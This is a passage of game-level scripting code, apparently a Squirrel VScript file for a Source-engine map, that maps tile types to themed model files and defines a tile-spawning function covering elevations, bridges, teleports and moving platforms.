							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},
	HOLD_2_INVERTED		={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},	
	BUTTON_2			={
							generic={main=["models/luffaren/collective_button.mdl"]},
							castle={main=["models/luffaren/collective_buttoncastle.mdl"]},
							factory={main=["models/luffaren/collective_buttonfactory.mdl"]},
							temple={main=["models/luffaren/collective_buttontemple.mdl"]},
							nature={main=["models/luffaren/collective_buttonnature.mdl"]},
							hell={main=["models/luffaren/collective_buttonhell.mdl"]},
							frost={main=["models/luffaren/collective_buttonfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_buttonsilenthill.mdl"]},
						},
	HOLD_3				={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},
	HOLD_3_INVERTED		={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},	
	BUTTON_3			={
							generic={main=["models/luffaren/collective_button.mdl"]},
							castle={main=["models/luffaren/collective_buttoncastle.mdl"]},
							factory={main=["models/luffaren/collective_buttonfactory.mdl"]},
							temple={main=["models/luffaren/collective_buttontemple.mdl"]},
							nature={main=["models/luffaren/collective_buttonnature.mdl"]},
							hell={main=["models/luffaren/collective_buttonhell.mdl"]},
							frost={main=["models/luffaren/collective_buttonfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_buttonsilenthill.mdl"]},
						},
	HOLD_4				={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},
	HOLD_4_INVERTED		={
							generic={main=["models/luffaren/collective_hold.mdl"]},
							castle={main=["models/luffaren/collective_holdcastle.mdl"]},
							factory={main=["models/luffaren/collective_holdfactory.mdl"]},
							temple={main=["models/luffaren/collective_holdtemple.mdl"]},
							nature={main=["models/luffaren/collective_holdnature.mdl"]},
							hell={main=["models/luffaren/collective_holdhell.mdl"]},
							frost={main=["models/luffaren/collective_holdfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_holdsilenthill.mdl"]},
						},	
	BUTTON_4			={
							generic={main=["models/luffaren/collective_button.mdl"]},
							castle={main=["models/luffaren/collective_buttoncastle.mdl"]},
							factory={main=["models/luffaren/collective_buttonfactory.mdl"]},
							temple={main=["models/luffaren/collective_buttontemple.mdl"]},
							nature={main=["models/luffaren/collective_buttonnature.mdl"]},
							hell={main=["models/luffaren/collective_buttonhell.mdl"]},
							frost={main=["models/luffaren/collective_buttonfrost.mdl"]},
							silenthill={main=["models/luffaren/collective_buttonsilenthill.mdl"]},
						},
	BOOSTPAD_JUMP		={
							generic={main=[
								"models/luffaren/collective_boostpad.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_boostpadcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_boostpadfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_boostpadtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_boostpadnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_boostpadhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_boostpadfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_boostpadsilenthill.mdl",
							]},
						},
	BOOSTPAD_L			={
							generic={main=[
								"models/luffaren/collective_boostpad.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_boostpadcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_boostpadfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_boostpadtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_boostpadnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_boostpadhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_boostpadfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_boostpadsilenthill.mdl",
							]},
						},
	BOOSTPAD_R			={
							generic={main=[
								"models/luffaren/collective_boostpad.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_boostpadcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_boostpadfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_boostpadtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_boostpadnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_boostpadhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_boostpadfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_boostpadsilenthill.mdl",
							]},
						},
	BOOSTPAD_U			={
							generic={main=[
								"models/luffaren/collective_boostpad.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_boostpadcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_boostpadfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_boostpadtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_boostpadnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_boostpadhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_boostpadfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_boostpadsilenthill.mdl",
							]},
						},
	BOOSTPAD_D			={
							generic={main=[
								"models/luffaren/collective_boostpad.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_boostpadcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_boostpadfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_boostpadtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_boostpadnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_boostpadhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_boostpadfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_boostpadsilenthill.mdl",
							]},
						},
	LOWGRAV			={
							generic={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_lowgravnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_lowgravhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_lowgravfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_lowgravsilenthill.mdl",
							]},
						},
	LOWGRAV_FLOOR		={
							generic={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_lowgrav.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_lowgravnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_lowgravhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_lowgravfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_lowgravsilenthill.mdl",
							]},
						},
	TELEPORT_1			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORTDEST_1			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORT_2			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORTDEST_2			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	AIRSLIDE			={
							generic={main=[
								"models/luffaren/collective_airslide.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_airslide.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_airslide.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_airslide.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_airslide.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_airslidehell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_airslidefrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_airslidesilenthill.mdl",
							]},
						},
	TELEPORT_3			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORTDEST_3			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORT_4			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	TELEPORTDEST_4			={
							generic={main=[
								"models/luffaren/collective_teleport.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_teleportcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_teleportfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_teleporttemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_teleportnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_teleporthell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_teleportfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_teleportsilenthill.mdl",
							]},
						},
	CROUCH			={
							generic={main=[
								"models/luffaren/collective_crouch.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_crouchcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_crouchfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_crouchtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_crouchnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_crouchhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_crouchfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_crouchsilenthill.mdl",
							]},
						},
	CROUCHTALL		={
							generic={main=[
								"models/luffaren/collective_crouchtall.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_crouchtallcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_crouchtallfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_crouchtalltemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_crouchtallnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_crouchtallhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_crouchtallfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_crouchtallsilenthill.mdl",
							]},
						},
	CROUCH_NOFLOOR			={
							generic={main=[
								"models/luffaren/collective_crouch.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_crouchcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_crouchfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_crouchtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_crouchnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_crouchhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_crouchfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_crouchsilenthill.mdl",
							]},
						},
	ASSUMEDFLOOR		={
							generic={main=[
								"models/luffaren/collective_platform.mdl",
							]},
							castle={main=[
								"models/luffaren/collective_platformcastle.mdl",
							]},
							factory={main=[
								"models/luffaren/collective_platformfactory.mdl",
							]},
							temple={main=[
								"models/luffaren/collective_platformtemple.mdl",
							]},
							nature={main=[
								"models/luffaren/collective_platformnature.mdl",
							]},
							hell={main=[
								"models/luffaren/collective_platformhell.mdl",
							]},
							frost={main=[
								"models/luffaren/collective_platformfrost.mdl",
							]},
							silenthill={main=[
								"models/luffaren/collective_platformsilenthill.mdl",
							]},
						},
	PLATFORM_HIDDEN		={
							generic={main=["models/luffaren/collective_hidden.mdl"]}
							castle={main=["models/luffaren/collective_hidden.mdl"]}
							factory={main=["models/luffaren/collective_hidden.mdl"]}
							temple={main=["models/luffaren/collective_hidden.mdl"]}
							nature={main=["models/luffaren/collective_hidden.mdl"]}
							hell={main=["models/luffaren/collective_hidden.mdl"]}
							frost={main=["models/luffaren/collective_hidden.mdl"]}
							silenthill={main=["models/luffaren/collective_hidden.mdl"]}
						},
	WALL_HIDDEN			={
							generic={main=["models/luffaren/collective_hiddenwall.mdl"]}
							castle={main=["models/luffaren/collective_hiddenwall.mdl"]}
							factory={main=["models/luffaren/collective_hiddenwall.mdl"]}
							temple={main=["models/luffaren/collective_hiddenwall.mdl"]}
							nature={main=["models/luffaren/collective_hiddenwall.mdl"]}
							hell={main=["models/luffaren/collective_hiddenwall.mdl"]}
							frost={main=["models/luffaren/collective_hiddenwall.mdl"]}
							silenthill={main=["models/luffaren/collective_hiddenwall.mdl"]}
						},
	PLATFORM_HIDDEN_BRIDGE		={
							generic={main=["models/luffaren/collective_hidden.mdl"]}
							castle={main=["models/luffaren/collective_hidden.mdl"]}
							factory={main=["models/luffaren/collective_hidden.mdl"]}
							temple={main=["models/luffaren/collective_hidden.mdl"]}
							nature={main=["models/luffaren/collective_hidden.mdl"]}
							hell={main=["models/luffaren/collective_hidden.mdl"]}
							frost={main=["models/luffaren/collective_hidden.mdl"]}
							silenthill={main=["models/luffaren/collective_hidden.mdl"]}
						},
	COLOR				={//this is always forced, no matter what
							generic={main=["models/luffaren/collective_color.mdl"]}
							castle={main=["models/luffaren/collective_color.mdl"]}
							factory={main=["models/luffaren/collective_color.mdl"]}
							temple={main=["models/luffaren/collective_color.mdl"]}
							nature={main=["models/luffaren/collective_color.mdl"]}
							hell={main=["models/luffaren/collective_color.mdl"]}
							frost={main=["models/luffaren/collective_color.mdl"]}
							silenthill={main=["models/luffaren/collective_color.mdl"]}
						},
};

function ProcessTileSpawn(x,y,map,index,start_elevation,end_elevation,mirrored)
{
	local endspawnqueue = [];
	local color=Vector(255,255,255);
	if((typeof index)=="Vector"){color=index;index = 9999;}	//COLOR
		//if(!(index in ::TYPES))return;					//OLD v1_5
		if(!(index in ::TYPES))index = 9998;				//NEW v1_6 - ASSUMEDFLOOR
	if(::TYPES[index].name=="EMPTY"||::TYPES[index].name=="EMPTY_LOS")return;
	if(::TYPES[index].name.find("HAZPLANE")==0)
	{
		if(::TYPES[index].name=="HAZPLANE_BOTTOM")
			::MAPDATA[mapspawnindex].hazplane_elev_bottom = GetElevationFromNeighbors(map,x,y,true,"all",0.00+DEFAULT_ELEVATION);
		else if(::TYPES[index].name=="HAZPLANE_TOP")
			::MAPDATA[mapspawnindex].hazplane_elev_top = GetElevationFromNeighbors(map,x,y,true,"all",0.00+DEFAULT_ELEVATION);
		else if(::TYPES[index].name=="HAZPLANE_SLOW")::MAPDATA[mapspawnindex].hazplane_movespeed = (0.00+::HAZPLANE_DSPEED_S);
		else if(::TYPES[index].name=="HAZPLANE_FAST")::MAPDATA[mapspawnindex].hazplane_movespeed = (0.00+::HAZPLANE_DSPEED_F);
		else if(::TYPES[index].name=="HAZPLANE_HARSH")::MAPDATA[mapspawnindex].hazplane_harsh = true;
		return;
	}
	else if(::TYPES[index].name.find("MOVEPLAT")==0)
	{
		if(::TYPES[index].name=="MOVEPLAT_SLOW")::MAPDATA[mapspawnindex].moveplat_speed = (0.00+::MOVEPLAT_SPEED_S);
		else if(::TYPES[index].name=="MOVEPLAT_FAST")::MAPDATA[mapspawnindex].moveplat_speed = (0.00+::MOVEPLAT_SPEED_F);
		else if(::TYPES[index].name.find("MOVEPLAT_DEST")==0)
		{
			local moveplat_idx = (::TYPES[index].name.slice(14,::TYPES[index].name.len()).tointeger()-1);
			local elevation = GetElevationFromNeighbors(map,x,y,true,"all",-10.00);
			if(elevation==null||elevation < -9.00)elevation = GetElevationFromNeighbors(map,x,y,false,"all",(0.00+DEFAULT_ELEVATION));
			local mp_pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
			if(::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx]==null)
				::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx]={pos=[],ps=0,pm=0,pl=0};
			::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx].pos.push(Vector(0,0,2)+mp_pos);
		}
		else
		{
			local checks = [{	dir= "left",		yaw= 180,	},
							{	dir= "right",		yaw= 0,		},
							{	dir= "up",			yaw= 90,	},
							{	dir= "down",		yaw= 270,	}];
			local hits = [];
			foreach(c in checks)
			{
				local nindex = GetMapNeighborIndex(map,x,y,c.dir);
				if(nindex==null)continue;
				if(::TYPES[nindex].name.find("MOVEPLAT_DEST")==0)
				{
					local moveplat_idx = (::TYPES[nindex].name.slice(14,::TYPES[nindex].name.len()).tointeger()-1);
					hits.push(moveplat_idx);
				}
			}
			if(hits.len()>0)
			{
				local moveplat_idx = hits[RandomInt(0,hits.len()-1)];
				if(::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx]==null)
					::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx]={pos=[],ps=0,pm=0,pl=0};
				if(::TYPES[index].name=="MOVEPLAT")::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx].ps++;
				else if(::TYPES[index].name=="MOVEPLATBIG")::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx].pm++;
				else if(::TYPES[index].name=="MOVEPLATHUGE")::MAPDATA[mapspawnindex].moveplat_destinations[moveplat_idx].pl++;
			}
		}
		return;
	}
	local elevation = GetElevation(index);
	local randyaw = [0,90,180,270];
	local spawndata = {pos=Vector(),yaw=randyaw[RandomInt(0,randyaw.len()-1)]};
	local crackbody = false;
	local breakable = false;
	local trapfloor = false;
	local angleslope = false;
	local bridgelowest = null;
	local epress = 0;
	local holdnameaffix = "";
	local model = ::TILEVARIANTS[::TYPES[index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].main.len()-1)];
	if(index == 9999)model = "models/luffaren/collective_color.mdl";		//ALWAYS force this model for color-tiles, just pure colors
	if(elevation==null)
	{
		elevation = GetElevationFromNeighbors(map,x,y,true,"all",-10.00);
		if(elevation==null||elevation < -9.00)elevation = GetElevationFromNeighbors(map,x,y,false,"all",(0.00+DEFAULT_ELEVATION));
		if(elevation==null)elevation=(0.00+DEFAULT_ELEVATION);
	}
	if(::TYPES[index].name=="FLOOR" || ::TYPES[index].name=="PLATFORM" || ::TYPES[index].name=="FLOORCEILING" || ::TYPES[index].name=="FLOORCEILINGTALL")
	{
		local checks = [
			{	dir= "left",		yaw= 180,	},
			{	dir= "right",		yaw= 0,		},
			{	dir= "up",			yaw= 90,	},
			{	dir= "down",		yaw= 270,	},
		];
		foreach(c in checks)
		{
			local nindex = GetMapNeighborIndex(map,x,y,c.dir);
			if(nindex==null)continue;
			if(nindex==145){return;}	//abort spawning FLOOR/PLATFORM/FLOORCEILING/FLOORCEILINGTILE tile if it's next to a 'FLOORBLOCK' tile, dir-specific below:
			//this is some stank-ass hardcoding my fuck what an annoyance
				if(current_dir == "east" && !mirrored)
				{
					if(c.dir == "left" && nindex == 189)return;
					if(c.dir == "right" && nindex == 188)return;
					if(c.dir == "up" && nindex == 187)return;
					if(c.dir == "down" && nindex == 186)return;
				}
				else if(current_dir == "east" && mirrored)
				{
					if(c.dir == "left" && nindex == 189)return;
					if(c.dir == "right" && nindex == 188)return;
					if(c.dir == "up" && nindex == 186)return;
					if(c.dir == "down" && nindex == 187)return;
				}
				if(current_dir == "west" && !mirrored)
				{
					if(c.dir == "left" && nindex == 188)return;
					if(c.dir == "right" && nindex == 189)return;
					if(c.dir == "up" && nindex == 186)return;
					if(c.dir == "down" && nindex == 187)return;
				}
				else if(current_dir == "west" && mirrored)
				{
					if(c.dir == "left" && nindex == 188)return;
					if(c.dir == "right" && nindex == 189)return;
					if(c.dir == "up" && nindex == 187)return;
					if(c.dir == "down" && nindex == 186)return;
				}
				if(current_dir == "north" && !mirrored)
				{
					if(c.dir == "left" && nindex == 187)return;
					if(c.dir == "right" && nindex == 186)return;
					if(c.dir == "up" && nindex == 188)return;
					if(c.dir == "down" && nindex == 189)return;
				}
				else if(current_dir == "north" && mirrored)
				{
					if(c.dir == "left" && nindex == 186)return;
					if(c.dir == "right" && nindex == 187)return;
					if(c.dir == "up" && nindex == 188)return;
					if(c.dir == "down" && nindex == 189)return;
				}
				if(current_dir == "south" && !mirrored)
				{
					if(c.dir == "left" && nindex == 186)return;
					if(c.dir == "right" && nindex == 187)return;
					if(c.dir == "up" && nindex == 189)return;
					if(c.dir == "down" && nindex == 188)return;
				}
				else if(current_dir == "south" && mirrored)
				{
					if(c.dir == "left" && nindex == 187)return;
					if(c.dir == "right" && nindex == 186)return;
					if(c.dir == "up" && nindex == 189)return;
					if(c.dir == "down" && nindex == 188)return;
				}
		}
	}
	if(::TYPES[index].name=="PLATFORM_BRIDGE" || ::TYPES[index].name=="PLATFORM_HIDDEN_BRIDGE")
	{
		local found_tallest = -50;
		local found_lowest = 50;
		local found_lowest_index = null;
		local checks = [
			{	dir= "left",		yaw= 180,		x= -1,		y= 0		},
			{	dir= "right",		yaw= 0,			x= 1,		y= 0		},
			{	dir= "up",			yaw= 90,		x= 0,		y= 1		},
			{	dir= "down",		yaw= 270,		x= 0,		y= -1		},
		];
		foreach(c in checks)
		{
			local cx = (0+x);
			local cy = (0+y);
			local keepscanning = true;
			local tries = 0;
			while(keepscanning)
			{
				keepscanning = false;
				tries++;
				if(tries>22)break;	//safeguard, should pose no risk, but i live in constant fear
				local nindex = GetMapNeighborIndex(map,cx,cy,c.dir);
				if(nindex==null||nindex==0||nindex==1||nindex==67||nindex==77)break;	//EMPTY,WALL,LIQUID_FALL,HAZLIQUID_FALL = ABORT SCAN!
				local nelev = GetElevationFromNeighbors(map,cx,cy,true,c.dir,-60.00);
				cx += c.x;
				cy += c.y;
				if(nelev==null||nelev < -50.00){keepscanning=true;continue;}
				if(nelev==null||nelev < -50.00){continue;}
				if(nelev < found_lowest)
				{
					found_lowest = (0+nelev);
					found_lowest_index = (0+nindex);
				}
				if(nelev > found_tallest)
					found_tallest = (0+nelev);
			}
		}
		if(found_lowest_index!=null)
		{
			local m2 = ::TILEVARIANTS[::TYPES[index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].main.len()-1)];
			local sq = {index=index,spawnindex=(0+mapspawnindex),color=color,modelname=m2};if(::THEME=="generic")sq.isgeneric<-true;
			if(found_tallest < -40)found_tallest = (0+DEFAULT_ELEVATION);
			if(found_tallest != found_lowest)	//if it's the same height, just default to the assumed floor
			{
				spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*found_tallest);
				endspawnqueue.push({
							_sq = sq,
							_pos = spawndata.pos,
							function Run()
							{
								::SpawnQueue.push(_sq);
								::SpawnQueueSpawner.push(_pos);
							}
						});
			}
			bridgelowest = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*found_lowest);
			index = (0+found_lowest_index);
			if(index>=45 && index<=64)index -= 40;				//NEW IN v1_9 - CONVERTS FLOORCEILING to FLOOR
			else if(index>=105 && index<=124)index -= 100;		//NEW IN v1_9 - CONVERTS FLOORCEILINGTALL to FLOOR
			model = ::TILEVARIANTS[::TYPES[index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[index].name][::THEME].main.len()-1)];
		}
	}
	if(::TYPES[index].name=="WALL_HIDDEN")	//mesh scaled down from original generic WALL size (X/Y wise) by:     0.9850     /   collisionmodel scaled UP by: 1.0100
	{
		local nfdata = GetNeighboringFloorData(map,x,y,(-50),false,true);
		if(nfdata.validfound)
		{
			elevation = nfdata.elevation;
			spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
			local sq = {index=nfdata.index,spawnindex=(0+mapspawnindex),color=color,modelname=nfdata.model};if(::THEME=="generic")sq.isgeneric<-true;
			if(::TYPES[index].name!="CROUCH_NOFLOOR")
			endspawnqueue.push({
						_sq = sq,
						_pos = spawndata.pos,
						function Run()
						{
							::SpawnQueue.push(_sq);
							::SpawnQueueSpawner.push(_pos);
						}
					});
		}
		else elevation -= 40;
		spawndata.pos = pos+Vector(GRID_SIZE*(x-0.5),GRID_SIZE*(y-0.5),ELEVATION*elevation);
	}
	if(::TYPES[index].name=="FLOOR" || ::TYPES[index].name=="PLATFORM" || ::TYPES[index].name=="FLOORCEILING" 
	|| ::TYPES[index].name=="FLOORCEILINGTALL" || ::TYPES[index].name=="TRAPFLOOR" || ::TYPES[index].name=="TRAPRANDOM")
	{
		local stepneighbors = [];
		local trapfloor_idx = (0+index);
		if(::TYPES[index].name=="TRAPFLOOR" || ::TYPES[index].name=="TRAPRANDOM")	//hack below to make the trapfloor-index temporarily act as one of the 3 floors:
		{
